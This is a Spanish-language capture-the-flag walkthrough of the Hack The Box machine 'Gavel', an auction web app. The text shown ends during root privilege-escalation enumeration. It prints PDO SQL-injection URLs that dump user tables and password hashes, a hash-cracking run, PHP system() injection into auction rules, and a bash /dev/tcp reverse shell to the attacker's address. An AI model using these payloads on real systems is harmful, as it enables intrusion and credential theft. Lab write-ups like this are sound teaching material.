---
title: "Gavel - Hack The Box"
date: 2025-12-02
draft: false
slug: "htb-writeup-gavel"
excerpt: "Esta fue una máquina complicada. Después de analizar los escaneos, nos dirigimos a analizar la página web activa en el puerto 80, siendo una página de subasta de objetos mágicos. Aplicando Fuzzing, descubrimos que la página web alberga un repositorio de GitHub que logramos dumpear, resultando ser una copia completa de la página web activa. Analizando el código del repositorio descargado, descubrimos una página que es vulnerable a Inyecciones SQL (SQLi), a la que tenemos acceso una vez que nos logueamos, y vemos que otra página puede ser vulnerable a Inyección de Comandos (CI), pero solamente tenemos acceso a esta con credenciales de administrador. Primero, aplicamos Inyecciones SQL a PDO, lo que nos permite dumpear un usuario y su contraseña en Hash Bcrypt que logramos crackear. Utilizamos estas credenciales para autenticarnos en la página y logramos ganar acceso a un panel de administrador. Como vimos antes, este panel resulta ser vulnerable a Inyección de Comandos (CI), lo que nos permite ejecutar una Reverse Shell con la que ganamos acceso principal a la máquina víctima. Dentro, encontramos que el único usuario registrado, es el mismo que encontramos al aplicar las SQLi, por lo que al probar la misma contraseña nos deja autenticarnos como este, siendo así que aplicamos Password Reuse. Enumerando la máquina, descubrimos un directorio que contiene la configuración de un sandbox de PHP y también contiene una plantilla de un archivo YAML que sirve para las subastas de la página web. Aplicamos un bypass al Sandbox de PHP para poder aplicar YAML injection, con tal de inyectar un comando que le dé permisos SUID a la Bash, logrando así escalar privilegios y convertirnos en Root."
categories: ["HackTheBox", "Medium Machine"]
tags: ["Linux", "YAML", "MySQL", "PHP Sandbox", "Git Repository", "Web Enumeration", "Fuzzing", "BurpSuite", "Dumping Git Repository", "Code Analysis", "PDO SQL Injections", "Cracking Hash", "Cracking Bcrypt Hash", "Command Injection (CI)", "Password Reuse", "YAML Deserialization", "YAML Injection", "Bypassing PHP Sandbox", "Privesc - YAML Deserialization", "Privesc - YAML Injection", "Privesc - Bypassing PHP Sandbox", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "git-dumper"
  - "pip"
  - "python3"
  - "mkdir"
  - "ChatGPT"
  - "hashid"
  - "JohnTheRipper"
  - "tcpdump"
  - "ping"
  - "nc"
  - "grep"
  - "su"
  - "sudo"
  - "id"
  - "linpeas.sh"
  - "wget"
  - "bash"
links:
  - "https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/"
  - "https://github.com/peass-ng/PEASS-ng"
  - "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-gavel/gavel.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.129.45.152
PING 10.129.45.152 (10.129.45.152) 56(84) bytes of data.
64 bytes from 10.129.45.152: icmp_seq=1 ttl=63 time=68.4 ms
64 bytes from 10.129.45.152: icmp_seq=2 ttl=63 time=71.5 ms
64 bytes from 10.129.45.152: icmp_seq=3 ttl=63 time=69.7 ms
64 bytes from 10.129.45.152: icmp_seq=4 ttl=63 time=71.5 ms

--- 10.129.45.152 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3012ms
rtt min/avg/max/mdev = 68.373/70.278/71.525/1.324 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.45.152 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 12:40 CST
Initiating SYN Stealth Scan at 12:40
Scanning 10.129.45.152 [65535 ports]
Discovered open port 22/tcp on 10.129.45.152
Discovered open port 80/tcp on 10.129.45.152
Completed SYN Stealth Scan at 12:41, 19.64s elapsed (65535 total ports)
Nmap scan report for 10.129.45.152
Host is up, received user-set (0.078s latency).
Scanned at 2025-12-02 12:40:58 CST for 20s
Not shown: 55237 closed tcp ports (reset), 10296 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.74 seconds
           Raw packets sent: 97302 (4.281MB) | Rcvd: 60390 (2.416MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo hay dos puertos abiertos. Supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 10.129.45.152 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 12:42 CST
Nmap scan report for 10.129.45.152
Host is up (0.070s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.52

|_http-title: Did not follow redirect to http://gavel.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.89 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo de la página web del **puerto 80** nos indica que hay una redirección a un dominio al momento de visitarla.

Registremos ese dominio en el `/etc/hosts`:
```bash
echo "10.129.45.152 gavel.htb" >> /etc/hosts
```
Visitemos la página para saber a qué nos enfrentamos.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura1.png">
</p>

Parece ser una página un poco extraña sobre compra de artículos curiosos.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura2.png">
</p>

No hay mucho que destacar.

Del lado izquierdo, podemos ver que nos podemos loguear y crear un usuario:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura3.png">
</p>

Entra a la opción de crear un usuario y crea uno para entrar a la página web:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura4.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura5.png">
</p>

Estamos dentro y del lado izquierdo tenemos dos páginas más.

Si entramos a la opción **Bidding**, encontraremos varios artículos que parecen estar dentro de una subasta:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura6.png">
</p>

Debemos ofrecer la cantidad que viene indicada en el mensaje de cada artículo para poder comprarlo:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura7.png">
</p>

Una vez que pasa el tiempo para subastar, el artículo pasa a nuestro inventario, que podemos ver en la opción **Inventory**:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura8.png">
</p>

De momento, es todo lo que podemos hacer con nuestro usuario.

Apliquemos **Fuzzing** para saber si hay algún directorio o archivo oculto.

### Fuzzing {#fuzz}

Primero probemos con la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://gavel.htb/FUZZ -t 300 -e .php,.txt,.html -mc 200,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://gavel.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,302
________________________________________________

.git/logs/              [Status: 200, Size: 1128, Words: 77, Lines: 18, Duration: 155ms]
.git/config             [Status: 200, Size: 136, Words: 13, Lines: 9, Duration: 158ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 167ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 134ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 150ms]
.git/index              [Status: 200, Size: 224718, Words: 313, Lines: 355, Duration: 5401ms]
index.php               [Status: 200, Size: 14108, Words: 4631, Lines: 223, Duration: 122ms]
index.php               [Status: 200, Size: 14071, Words: 4626, Lines: 223, Duration: 122ms]
inventory.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 93ms]
login.php               [Status: 200, Size: 4281, Words: 1817, Lines: 79, Duration: 117ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 200ms]
register.php            [Status: 200, Size: 4485, Words: 1571, Lines: 85, Duration: 150ms]
:: Progress: [18984/18984] :: Job [1/1] :: 219 req/sec :: Duration: [0:00:33] :: Errors: 24 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*       | Para indicar una busqueda de archivos específicos. |
| *-mc*      | Para indicar que muestre solo resultados con códigos de estados específicos. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://gavel.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 300 -x php,txt,html --ne
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gavel.htb
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/config          (Status: 200) [Size: 136]
/admin.php            (Status: 302) [Size: 0] [--> index.php]
/assets               (Status: 301) [Size: 307] [--> http://gavel.htb/assets/]
/includes             (Status: 301) [Size: 309] [--> http://gavel.htb/includes/]
/index.php            (Status: 200) [Size: 14014]
/index.php            (Status: 200) [Size: 14054]
/inventory.php        (Status: 302) [Size: 0] [--> index.php]
/login.php            (Status: 200) [Size: 4281]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/register.php         (Status: 200) [Size: 4485]
/rules                (Status: 301) [Size: 306] [--> http://gavel.htb/rules/]
/server-status        (Status: 403) [Size: 274]
Progress: 18984 / 18984 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar una busqueda de archivos específicos. |
| *--ne*     | Para que no muestre errores. |

Encontramos algunos archivos como **admin.php**, pero lo más interesante es ver que hay un repositorio de **Git** expuesto, así que vamos a descargarlo.

### Dumpeando Repositorio de Git Expuesto y Analizando su Contenido {#DumpGit}

Para dumpear el repositorio de **Git**, utilizaremos la siguiente herramienta:
* <a href="https://github.com/arthaud/git-dumper" target="_blank">Repositorio de arthaud: git-dumper</a>
 
Una vez que lo descargues, instala los requerimientos y ya podrás usar la herramienta:
```bash
pip install -r requirements.txt

python3 git_dumper.py
usage: git-dumper [options] URL DIR
git_dumper.py: error: the following arguments are required: URL, DIR
```

Crea un directorio donde se guarde el repo e indícale a **git-dumper** que lo almacene ahí:
```bash
mkdir gavel-git

python3 git-dumper/git_dumper.py http://gavel.htb/.git/ gavel-git
[-] Testing http://gavel.htb/.git/HEAD [200]
[-] Testing http://gavel.htb/.git/ [200]
...
[-] Running git checkout .
Actualizadas 1849 rutas desde el índice
```
Excelente, tenemos el repositorio completo.

Analicemos su contenido.

#### Analizando Script inventory.php e Identificando Posibles Vulnerabilidades {#inventory}

Dentro del contenido del repo, podemos analizar el siguiente script **inventory.php**, donde podemos ver cómo funciona:
```bash
cat inventory.php
<?php
require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/db.php';
require_once __DIR__ . '/includes/session.php';

if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}

$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
$itemMap = [];
$itemMeta = $pdo->prepare("SELECT name, description, image FROM items WHERE name = ?");
try {
    if ($sortItem === 'quantity') {
        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
        $stmt->execute([$userId]);
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) {
    $results = [];
}
foreach ($results as $row) {
    $firstKey = array_keys($row)[0];
    $name = $row['item_name'] ?? $row[$firstKey] ?? null;
    if (!$name) {
        continue;
    }
    $meta = [];
    try {
        $itemMeta->execute([$name]);
        $meta = $itemMeta->fetch(PDO::FETCH_ASSOC);
    } catch (Exception $e) {
        $meta = [];
    }
    $itemMap[$name] = [
        'name' => $name ?? "",
        'description' => $meta['description'] ?? "",
        'image' => $meta['image'] ?? "",
        'quantity' => $row['quantity'] ?? (is_numeric($row[$firstKey]) ? $row[$firstKey] : 1)
    ];
}
$stmt = $pdo->prepare("SELECT money FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user']['id']]);
$money = $stmt->fetchColumn();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Your Inventory</title>
...
...
</body>
</html>
```
De manera general, le ayuda al usuario para ordenar por **item_name** o **quantity**, y el script consulta la base de datos para obtener los ítems del usuario, junto con su metadata (descripción, imagen), y los renderiza en una vista **HTML**.

Pero podemos visualizar algunas cosillas interesantes:
* Para poder ver esta página, necesitamos estar logueados como un usuario, en caso de no estarlo, nos redirigirá al `index.php`.
* Tenemos dos parámetros; el primero es el de **user_id**, que encontramos en la variable `$userId = $_POST['user_id']...` y el segundo es **sort**, que encontramos en la variable `$sortItem = $_POST['sort']...`.
* La siguiente línea puede ser vulnerable a SQLi, pues no valida el contenido que el usuario puede incluir:
```bash
$col = "`" . str_replace("`", "", $sortItem) . "`";
```

* Por último, lo más importante que podemos visualizar es lo siguiente:
```bash
if ($sortItem === 'quantity') {
    $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
} else {
    $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
}
```
En esta condicional, si el usuario elige la opción **quantity**, la consulta se sanitiza, pero si utiliza otra opción, la consulta no contiene ningún filtro.

Además, podemos ver el uso de la instancia **PDO (PHP Data Object)** y **statement**.

| **PDO (PHP Data Object)** |
|:-------------------------:|
| *PDO es una interfaz de PHP para trabajar con bases de datos. Es una librería incluida en PHP que permite conectarte a distintos motores de base de datos (MySQL, MariaDB, PostgreSQL, SQLite, SQL Server, etc.), ejecutar consultas SQL, usar sentencias preparadas (prepared statements), etc.* |

| **Statement** |
|:-------------:|
| *Un statement (en PHP, un objeto PDOStatement) es una consulta SQL preparada y lista para ejecutarse. representa una sentencia SQL precompilada donde los valores reales se pasan después con execute().* |

Gracias a este análisis, podemos decir que es muy probable que la página **inventory.php** sea vulnerable a **Inyecciones SQL**.

#### Analizando Script admin.php e Identificando Posibles Vulnerabilidades {#admin}

Analicemos el script **admin.php**:
```bash
cat admin.php
<?php
require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/db.php';
require_once __DIR__ . '/includes/session.php';
require_once __DIR__ . '/includes/auction.php';

if (!isset($_SESSION['user']) || $_SESSION['user']['role'] !== 'auctioneer') {
    header('Location: index.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $auction_id = intval($_POST['auction_id'] ?? 0);
    $rule = trim($_POST['rule'] ?? '');
    $message = trim($_POST['message'] ?? '');

    if ($auction_id > 0 && (empty($rule) || empty($message))) {
        $stmt = $pdo->prepare("SELECT rule, message FROM auctions WHERE id = ?");
        $stmt->execute([$auction_id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$row) {
            $_SESSION['success'] = 'Auction not found.';
            header('Location: admin.php');
            exit;
        }
        if (empty($rule))    $rule = $row['rule'];
        if (empty($message)) $message = $row['message'];
    }

    if ($auction_id > 0 && $rule && $message) {
        $stmt = $pdo->prepare("UPDATE auctions SET rule = ?, message = ? WHERE id = ?");
        $stmt->execute([$rule, $message, $auction_id]);
        $_SESSION['success'] = 'Rule and message updated successfully!';
        header('Location: admin.php');
        exit;
    }
}

$stmt = $pdo->query("SELECT * FROM auctions WHERE status = 'active' ORDER BY id");
$current_auction = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Auction Admin</title>
...
...
</body>
</html>
```
Esta página desplegada permite cambiar la regla y mensaje de cualquier producto que se encuentre dentro de la subasta. Se realiza mediante un formulario al que solo tienen acceso los usuarios con el rol **auctioneer**, que son quienes pueden entrar al **panel de admin**.

Expliquemos lo más relevante que tiene este script:
* Al inicio, vemos que hay un control de acceso en donde solo los usuarios con el rol **auctioneer**, pueden usar el panel admin. Lo curioso es que parece ser también un usuario y no solo un rol:
```bash
if (!isset($_SESSION['user']) || $_SESSION['user']['role'] !== 'auctioneer') {
    header('Location: index.php');
    exit;
}
```

* Vemos cómo se maneja el procesamiento del formulario, que solo se ejecuta si se envía por **petición POST**.
* Observa que se obtienen 3 valores, siendo 2 de estos los que el usuario puede modificar, que son **rule** y **message**:
```bash
$auction_id = intval($_POST['auction_id'] ?? 0);
$rule = trim($_POST['rule'] ?? '');
$message = trim($_POST['message'] ?? '');
```

* Una vez que se obtengan los valores que da el usuario, se realiza la actualización de los valores, directamente a la base de datos, sin ninguna sanitización:
```bash
$stmt = $pdo->prepare("UPDATE auctions SET rule = ?, message = ? WHERE id = ?");
$stmt->execute([$rule, $message, $auction_id]);
```
Esto quiere decir que cualquier cosa que indique en los valores **rule** y **message**, se almacena en la BD y puede que se ejecute también.

Sabiendo esta información, es posible que esta página pueda ser vulnerable a **Inyección de Comandos**.

Después de este análisis, empecemos por explotar la página **inventory.php** y después **admin.php**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando PDO SQL Injections y Crackeando Hash Bcrypt {#SQLi}

Investigando un poco sobre **Inyecciones SQL** aplicadas a **PDO (PHP Data Object)**, podemos encontrar el siguiente blog:
* <a href="https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/" target="_blank">A Novel Technique for SQL Injection in PDO’s Prepared Statements</a>

Leyendo el blog, nos menciona que es posible aplicar **SQLi** a **PDO (PHP Data Object)** en distintos escenarios, siendo que muestra uno similar al funcionamiento de la página **inventory.php**:
```bash
http://localhost:8000/?name=x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23&col=\?%23%00
```
Expliquemos la inyección:
* La inyección comienza con un backtick que cierra el nombre del identificador que el backend está construyendo.
* Construye una subconsulta que devuelve nombres de tablas del esquema.
* Usa `AS 'x` para definir una columna con un nombre controlado.
* Por último, tenemos lo siguiente en el segundo parámetro:
	* El `\?` forza a que el backend reciba algo como columna para escapar el contexto.
	* El `%23` es un comentario URL encodeado del símbolo `#`.
	* El `%00` es un **Null byte** URL encodeado, siendo originalmente `\x00`.

En resumen, está ocupando filtros para aplicar bypass a las restricciones que están activas en la página **inventory.php**.

Utilicemos la misma inyección y modifiquémosla para que tenga los mismos parámetros, quedando de esta forma:
```bash
http://gavel.htb/inventory.php?user_id=x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23--&sort=\?%23%00--
```

Pruébala:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura9.png">
</p>

Excelente, podemos ver todas las tablas de la base de datos y observa que podemos ver la tabla **users**.

Utiliza la siguiente inyección para ver los usuarios y contraseñas de esa tabla:
```bash
http://gavel.htb/inventory.php?user_id=x` FROM (SELECT CONCAT(username,0x3a,password) AS `'x` FROM users)y;%23--&sort=%5C?%23%00--
```

Pruébala:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura10.png">
</p>

Genial, tenemos el hash de la contraseña del **usuario auctioneer**.

Identifiquemos el tipo de Hash:
```bash
hashid '$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS'
Analyzing '$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt
```
Parece ser más un Hash en formato **bcrypt**.

Guárdalo dentro de un archivo y crackéalo con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********        (?)     
1g 0:00:00:27 DONE (2025-12-02 19:07) 0.03698g/s 113.8p/s 113.8c/s 113.8C/s iamcool..milena
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Probémosla:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura11.png">
</p>

Muy bien, somos el **usuario auctioneer** y podemos ver el panel **admin**.

### Aplicando Inyección de Comandos en Panel de Admin y Ganando Acceso a la Máquina Víctima {#RCE}

Ya analizamos el panel de admin y vimos que puede ser vulnerable a inyección de comandos, pero tenemos que tomar en cuenta el siguiente **archivo YAML**:
```bash
cat gavel-git/rules/default.yaml
rules:
  - rule: "return $current_bid >= $previous_bid * 1.1;"
    message: "Bid at least 10% more than the current price."

  - rule: "return $current_bid % 5 == 0;"
    message: "Bids must be in multiples of 5. Your account balance must cover the bid amount."

  - rule: "return $current_bid >= $previous_bid + 5000;"
    message: "Only bids greater than 5000 + current bid will be considered. Ensure you have sufficient balance before placing such bids."
```
Estas reglas parecen ser fragmentos de código **PHP** dentro de strings, probablemente evaluados dinámicamente en el backend.

Podemos probar a ejecutar un comando de la siguiente forma:
```bash
return system('whoami');
```

Veamos qué es lo que sucede:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura12.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura13.png">
</p>

Para que se haga efectiva la ejecución, tenemos que hacer una puja del producto donde inyectamos el comando:

<p align="center">
<img src="/assets/images/htb-writeup-gavel/Captura14.png">
</p>

No vemos un resultado como tal, pero parece que sí se está ejecutando algo.

Notarás que la página se estará recargando cada segundo que pasa, por lo que hay una gran probabilidad de que nuestro comando se esté ejecutando cada segundo.

Para probar rápidamente si es que encontramos una forma de ejecutar comandos, podemos mandarnos una **traza ICMP** a nuestra máquina.

Primero, levantemos un listener con **tcpdump** para que capture esa **traza ICMP**:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Usemos la misma sintaxis y manda un **ping** a tu IP:
```bash
return system('ping Tu_IP');
```

Observa el resultado en el **tcpdump**:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
00:38:01.929903 IP 10.10.11.97 > Tu_IP: ICMP echo request, id 1, seq 1, length 64
00:38:01.929927 IP Tu_IP > 10.10.11.97: ICMP echo reply, id 1, seq 1, length 64
00:38:02.931408 IP 10.10.11.97 > Tu_IP: ICMP echo request, id 1, seq 2, length 64
...
40 packets captured
40 packets received by filter
0 packets dropped by kernel
```
Hemos descubierto que este panel es vulnerable a **Inyección de Comandos**, por lo que podemos mandarnos una **Reverse Shell**.

Levanta un listener con **netcat**:
```bash
nc -nlvp 4444
listening on [any] 4444 ...
```

Ejecuta la siguiente **Reverse Shell**:
```bash
return system('bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"');
```

Observa la **netcat**:
```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.97] 59712
bash: cannot set terminal process group (996): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gavel:/var/www/html/gavel/includes$ whoami
whoami
www-data
```
Estamos dentro.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Continuemos.

#### Identificando Password Reuse y Autenticandonos como Usuario Auctioneer {#PasswordReuse}

Veamos qué usuarios existen en la máquina:
```bash
www-data@gavel:/var/www/html/gavel/includes$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
auctioneer:x:1001:1002::/home/auctioneer:/bin/bash
```
Solo hay un usuario además del **Root**.

Podemos ver su directorio en el directorio `/home`:
```bash
www-data@gavel:/var/www/html/gavel/includes$ ls -la /home
total 12
drwxr-xr-x  3 root       root       4096 Nov  5 12:46 .
drwxr-xr-x 19 root       root       4096 Nov  5 12:46 ..
drwxr-x---  2 auctioneer auctioneer 4096 Dec  6 04:00 auctioneer
```
Como tiene el mismo nombre que el usuario que usamos para entrar en el panel de admin, puede que se haya ocupado la misma contraseña para este usuario.

Comprobémoslo:
```bash
www-data@gavel:/home$ su auctioneer
Password: 
auctioneer@gavel:/home$ 
```
Ahora somos el **usuario auctioneer**.

Podemos conseguir la flag del usuario en su directorio:
```bash
auctioneer@gavel:/home$ cd auctioneer/
auctioneer@gavel:~$ ls
user.txt
auctioneer@gavel:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Aplicando YAML Injection para Realizar un Bypass a las Restricciones del PHP Sandbox y así Escalar Privilegios {#YAMLinjection}

Veamos qué privilegios tiene nuestro usuario:
```bash
auctioneer@gavel:~$ sudo -l
[sudo] password for auctioneer: 
Sorry, user auctioneer may not run sudo on gavel.
```
No tenemos ningún privilegio.

Veamos a qué grupos pertenece nuestro usuario:
```bash
auctioneer@gavel:~$ id
uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
```
Estamos dentro de un grupo llamado **gavel-seller** que puede que nos sirva para más adelante.

Enumerando un poco la máquina víctima, encontraremos un directorio curioso en el directorio `/opt`:
```bash
auctioneer@gavel:~$ ls -la /opt
total 12
drwxr-xr-x  3 root root 4096 Nov  5 12:46 .
drwxr-xr-x 19 root root 4096 Nov  5 12:46 ..
drwxr-xr-x  4 root root 4096 Nov  5 12:46 gavel
```

Veamos su contenido:
```bash
auctioneer@gavel:~$ ls -la /opt/gavel/
total 56
drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
-rwxr-xr-- 1 root root 35992 Oct  3 19:35 gaveld
-rw-r--r-- 1 root root   364 Sep 20 14:54 sample.yaml
drwxr-x--- 2 root root  4096 Dec  6 04:00 submission
```
Hay algunos archivos; entre ellos vemos un **archivo YAML**.

Leamos el contenido del **archivo YAML**:
```bash
auctioneer@gavel:~$ cat /opt/gavel/sample.yaml 
---
item:
  name: "Dragon's Feathered Hat"
  description: "A flamboyant hat rumored to make dragons jealous."
  image: "https://example.com/dragon_hat.png"
  price: 10000
  rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
  rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
```
Este archivo solo sirve de ejemplo de cómo funciona el sistema de subastas de la página web.

Revisando el contenido del directorio `.config`, encontraremos un archivo **php.ini**:
```bash
auctioneer@gavel:/tmp/privesc$ cat /opt/gavel/.config/php/php.ini 
engine=On
display_errors=On
display_startup_errors=On
log_errors=Off
error_reporting=E_ALL
open_basedir=/opt/gavel
memory_limit=32M
max_execution_time=3
max_input_time=10
